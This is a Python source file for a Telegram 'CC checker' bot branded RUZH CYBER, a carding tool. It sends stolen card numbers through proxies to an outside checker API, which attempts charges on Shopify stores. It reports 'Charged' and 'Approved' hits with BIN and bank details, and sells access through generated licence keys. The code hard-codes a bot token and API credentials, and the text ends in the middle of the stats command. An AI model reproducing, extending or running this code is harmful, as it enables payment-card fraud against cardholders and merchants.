from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
from datetime import datetime, timedelta

# ================================================================
# RUZH CYBER - CC CHECKER BOT v8.0
# AUTHOR: RUZH CYBER
# STATUS: ELITE EDITION WITH FULL MANAGEMENT
# ================================================================

# ─── CONFIG ───
CHECKER_API_URL = 'http://62.72.20.10:8081/'

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
    "🔑": "6026367225466720832",
    "👤": "5971837723676249096",
    "📌": "5974235702701853774",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ─── BOT TOKEN ───
API_ID = 39407140
API_HASH = '1f11d571c39a98e155cc43a326a92736'
BOT_TOKEN = '8727643641:AAEZKxHjXWTXl32lyBf9EDhxL2u1JY9QPDU'

# ─── ADMINS ───
ADMIN_IDS = ['6570394829', '6395195181']

# ─── FILES ───
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
KEYS_FILE = 'keys.txt'
BANNED_FILE = 'banned.txt'
USERS_FILE = 'users.txt'

bot = TelegramClient('ruzh_checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
sent_hits = set()
lock = asyncio.Lock()

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

# ─── BANNED SYSTEM ───

def load_banned():
    if not os.path.exists(BANNED_FILE):
        return []
    try:
        with open(BANNED_FILE, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def is_banned(user_id):
    return str(user_id) in load_banned()

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for u in banned:
                f.write(f"{u}\n")

# ─── USERS SYSTEM ───

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data
    except:
        return {}

def save_user(user_id, username):
    users = load_users()
    users[str(user_id)] = {
        'username': username,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2)

def update_user_last_seen(user_id):
    users = load_users()
    if str(user_id) in users:
        users[str(user_id)]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=2)

# ─── KEY SYSTEM ───

def load_keys():
    keys = {}
    if not os.path.exists(KEYS_FILE):
        return keys
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    parts = line.split('|')
                    if len(parts) >= 3:
                        key = parts[0]
                        user_id = parts[1]
                        expiry = parts[2]
                        keys[key] = {'user_id': user_id, 'expiry': expiry}
    except:
        pass
    return keys

def save_key(key, user_id, expiry):
    with open(KEYS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{key}|{user_id}|{expiry}\n")

def is_key_valid(key):
    keys = load_keys()
    if key not in keys:
        return False, None
    expiry = keys[key]['expiry']
    if expiry == 'permanent':
        return True, keys[key]['user_id']
    try:
        expiry_date = datetime.strptime(expiry, '%Y-%m-%d')
        if datetime.now() <= expiry_date:
            return True, keys[key]['user_id']
    except:
        pass
    return False, None

def generate_key(days):
    key = secrets.token_hex(8).upper()
    expiry_date = datetime.now() + timedelta(days=days)
    return key, expiry_date.strftime('%Y-%m-%d')

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def is_premium(user_id):
    # ئەگەر باند کرابوو
    if is_banned(user_id):
        return False
    if is_admin(user_id):
        return True
    if str(user_id) in get_file_lines(PREMIUM_FILE):
        return True
    keys = load_keys()
    for k, v in keys.items():
        if v['user_id'] == str(user_id):
            if v['expiry'] == 'permanent':
                return True
            try:
                expiry_date = datetime.strptime(v['expiry'], '%Y-%m-%d')
                if datetime.now() <= expiry_date:
                    return True
            except:
                pass
    return False

# ─── HELPERS ───
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return (
                    data.get('brand', '-'),
                    data.get('type', '-'),
                    data.get('level', '-'),
                    data.get('bank', '-'),
                    data.get('country_name', '-'),
                    data.get('country_flag', '')
                )
    except:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid', 'message': 'Invalid card', 'card': card}

        params = {'cc': card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(k in response_lower for k in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'declined' in response_lower or 'denied' in response_lower:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def clear_hit_cache(hit_key):
    await asyncio.sleep(300)
    sent_hits.discard(hit_key)

async def send_realtime_hit(user_id, result, hit_type, username):
    card_id = result['card'].split('|')[0]
    hit_key = f"{user_id}_{card_id}_{hit_type}"
    
    if hit_key in sent_hits:
        return
    
    sent_hits.add(hit_key)
    asyncio.create_task(clear_hit_cache(hit_key))
    
    if hit_type == "Charged":
        emoji, status_text = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif hit_type == "Approved":
        emoji, status_text = "🔥", "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    else:
        emoji, status_text = "❌", "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    msg = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

    try:
        await bot.send_message(user_id, premium_emoji(msg), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    text = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Approved: {len(results['approved'])} | ❌ Declined: {len(results['declined'])} | 💀 Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Approved: {len(results['approved'])} | ❌ Declined: {len(results['declined'])} | 💀 Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ruzh_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 RUZH CYBER CC CHECKER RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")
        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")
        await f.write(f"❌ DECLINED ({len(results['declined'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['declined']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")
        await f.write(f"💀 DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

# ─── TEST FUNCTIONS ───

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'url': test_site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ─── COMMANDS ───

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    username = event.sender.username or "No username"
    
    # تۆمارکردنی بەکارهێنەر
    save_user(user_id, username)
    update_user_last_seen(user_id)
    
    # پشکنینی باند بوون
    if is_banned(user_id):
        await event.reply(premium_emoji(
            "<b>🚫 You have been BANNED from this bot!</b>\n"
            "<b>Contact admin for more information.</b>"
        ), parse_mode='html')
        return
    
    is_admin_user = is_admin(user_id)
    is_premium_user = is_premium(user_id)
    
    if is_admin_user:
        await event.reply(premium_emoji(
            "<b>⚡💳 Welcome Admin! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>👑 You have FULL ACCESS to all commands!</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐔𝐬𝐞𝐫 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /genkey 7 - Generate key\n"
            "• /genkey 7 5248903529 - Generate key for user\n"
            "• /keys - List all keys\n"
            "• /delkey KEY - Delete a key\n"
            "• /users - List all users\n"
            "• /ban 5248903529 - Ban user\n"
            "• /unban 5248903529 - Unban user\n"
            "• /banned - List banned users\n"
            "• /broadcast MSG - Send message to all users\n"
            "• /stats - Bot statistics</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 & 𝐏𝐫𝐨𝐱𝐲</b>\n"
            "<blockquote>• /fuck - Check all sites\n"
            "• /proxy - Check all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>👤 Your ID: {user_id}</b>"
        ), parse_mode='html')
        return
    
    if is_premium_user:
        await event.reply(premium_emoji(
            "<b>⚡💳 Welcome to RUZH CYBER CC Checker! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐊𝐞𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /redeem KEY - Activate your key</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 & 𝐏𝐫𝐨𝐱𝐲</b>\n"
            "<blockquote>• /fuck - Check all sites\n"
            "• /proxy - Check all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>👤 Your ID: {user_id}</b>"
        ), parse_mode='html')
        return
    
    await event.reply(premium_emoji(
        "<b>⚡💳 Welcome to RUZH CYBER CC Checker! 💳⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>⚠️ You don't have access to this bot.</b>\n"
        "<b>Please contact admin to get a key.</b>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>🔑 If you have a key, use:</b>\n"
        "<code>/redeem YOUR_KEY</code>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_command(event):
    user_id = event.sender_id
    username = event.sender.username or "No username"
    
    # تۆمارکردنی بەکارهێنەر
    save_user(user_id, username)
    
    if is_banned(user_id):
        await event.reply(premium_emoji("🚫 You are banned!"))
        return
    
    if is_admin(user_id):
        await event.reply(premium_emoji("👑 You are an admin! You have full access."))
        return
    
    args = event.message.text.split()
    
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Please provide a key: <code>/redeem YOUR_KEY</code>"), parse_mode='html')
        return
    
    key = args[1].upper()
    valid, key_user_id = is_key_valid(key)
    
    if not valid:
        await event.reply(premium_emoji("❌ Invalid or expired key!"))
        return
    
    # 🔥 چارەسەری کێشە: کلیل بۆ ئەو بەکارهێنەرە دروست کراوە
    # پێویست نییە چەک بکەین، تەنها پشکنینی کلیل
    if key_user_id:
        # ئەگەر کلیل بۆ ئەم بەکارهێنەرە دروست کراوە، ڕێگەی پێبدە
        keys = load_keys()
        expiry = keys[key]['expiry']
        days_left = "Permanent" if expiry == 'permanent' else f"{ (datetime.strptime(expiry, '%Y-%m-%d') - datetime.now()).days } days left"
        
        await event.reply(premium_emoji(
            f"<b>✅ Key activated successfully!</b>\n"
            f"<blockquote>🔑 Key: <code>{key}</code></blockquote>\n"
            f"<blockquote>⏳ Expiry: {days_left}</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡ You can now use all bot commands!</b>"
        ), parse_mode='html')
        return
    
    await event.reply(premium_emoji("❌ Invalid key!"))

@bot.on(events.NewMessage(pattern='/genkey'))
async def genkey_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji(
            "❌ Usage:\n"
            "<code>/genkey 7</code> - For yourself\n"
            "<code>/genkey 7 5248903529</code> - For user\n"
            "<code>/genkey permanent</code> - Permanent key"
        ), parse_mode='html')
        return
    
    target_user_id = str(user_id)
    days_arg = args[1]
    
    if len(args) >= 3:
        target_user_id = args[2]
    
    if days_arg.lower() == 'permanent':
        days = 36500
        expiry_text = 'permanent'
    else:
        try:
            days = int(days_arg)
            if days <= 0:
                await event.reply(premium_emoji("❌ Days must be positive!"))
                return
        except:
            await event.reply(premium_emoji("❌ Invalid days!"))
            return
    
    key, expiry_date = generate_key(days)
    if days_arg.lower() == 'permanent':
        expiry_date = 'permanent'
    
    save_key(key, target_user_id, expiry_date)
    
    days_text = "Permanent" if expiry_date == 'permanent' else f"{days} days"
    await event.reply(premium_emoji(
        f"<b>✅ Key generated successfully!</b>\n"
        f"<blockquote>🔑 Key: <code>{key}</code></blockquote>\n"
        f"<blockquote>👤 User ID: {target_user_id}</blockquote>\n"
        f"<blockquote>⏳ Duration: {days_text}</blockquote>\n"
        f"<blockquote>📅 Expiry: {expiry_date}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>Share this key with your user!</b>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern='/keys'))
async def list_keys_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    keys = load_keys()
    if not keys:
        await event.reply(premium_emoji("📭 No keys found."))
        return
    
    text = "<b>🔑 Keys List:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for k, v in keys.items():
        valid, _ = is_key_valid(k)
        status = "✅ Active" if valid else "❌ Expired"
        text += f"<code>{k}</code> | User: {v['user_id']} | {v['expiry']} | {status}\n"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/delkey'))
async def delete_key_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/delkey KEY</code>"), parse_mode='html')
        return
    
    key_to_delete = args[1].upper()
    keys = load_keys()
    
    if key_to_delete not in keys:
        await event.reply(premium_emoji("❌ Key not found!"))
        return
    
    with open(KEYS_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    with open(KEYS_FILE, 'w', encoding='utf-8') as f:
        for line in lines:
            if not line.startswith(key_to_delete + '|'):
                f.write(line)
    
    await event.reply(premium_emoji(f"✅ Key <code>{key_to_delete}</code> deleted!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def list_users_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    users = load_users()
    if not users:
        await event.reply(premium_emoji("📭 No users found."))
        return
    
    text = "<b>👤 Users List:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for uid, data in users.items():
        username = data.get('username', 'No username')
        first_seen = data.get('first_seen', 'Unknown')
        last_seen = data.get('last_seen', 'Unknown')
        # پشکنینی ئەگەر باند کرابوو
        banned = "🚫" if is_banned(uid) else "✅"
        text += f"{banned} <code>{uid}</code> | @{username}\n"
        text += f"   📅 {first_seen}\n"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/ban USER_ID</code>"), parse_mode='html')
        return
    
    target_id = args[1]
    if target_id in ADMIN_IDS:
        await event.reply(premium_emoji("❌ Cannot ban an admin!"))
        return
    
    if is_banned(target_id):
        await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already banned!"), parse_mode='html')
        return
    
    ban_user(target_id)
    await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> has been banned!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/unban USER_ID</code>"), parse_mode='html')
        return
    
    target_id = args[1]
    if not is_banned(target_id):
        await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not banned!"), parse_mode='html')
        return
    
    unban_user(target_id)
    await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> has been unbanned!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/banned'))
async def list_banned_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    banned = load_banned()
    if not banned:
        await event.reply(premium_emoji("📭 No banned users."))
        return
    
    text = "<b>🚫 Banned Users:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for uid in banned:
        users = load_users()
        username = users.get(uid, {}).get('username', 'Unknown')
        text += f"• <code>{uid}</code> | @{username}\n"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/broadcast Your message here</code>"), parse_mode='html')
        return
    
    msg = args[1]
    status_msg = await event.reply(premium_emoji("📤 Sending broadcast..."))
    
    users = load_users()
    sent_count = 0
    for uid, data in users.items():
        try:
            # نەناردن بۆ بەکارهێنەرانی باند
            if is_banned(uid):
                continue
            await bot.send_message(int(uid), premium_emoji(f"<b>📢 Broadcast from Admin:</b>\n\n{msg}"), parse_mode='html')
            sent_count += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    # ناردن بۆ ئەدمینەکان
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(int(admin_id), premium_emoji(f"<b>📢 Broadcast from Admin:</b>\n\n{msg}"), parse_mode='html')
        except:
            pass
    
    await status_msg.edit(premium_emoji(f"✅ Broadcast sent to {sent_count} users!"))

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Admin only command!"))
        return
    
    keys = load_keys()
    total_keys = len(keys)
    active_keys = 0
    expired_keys = 0
    
    for k in keys:
        valid, _ = is_key_valid(k)
        if valid:
            active_keys += 1
        else:
            expired_keys += 1
    
    sites = load_sites()
    proxies = load_proxies()
    users = load_users()
    banned = load_banned()
    
    text = f"""<b>📊 Bot Statistics</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>👤 Users:</b>
<blockquote>• Total: {len(users)}
• Banned: {len(banned)}</blockquote>
<b>🔑 Keys:</b>
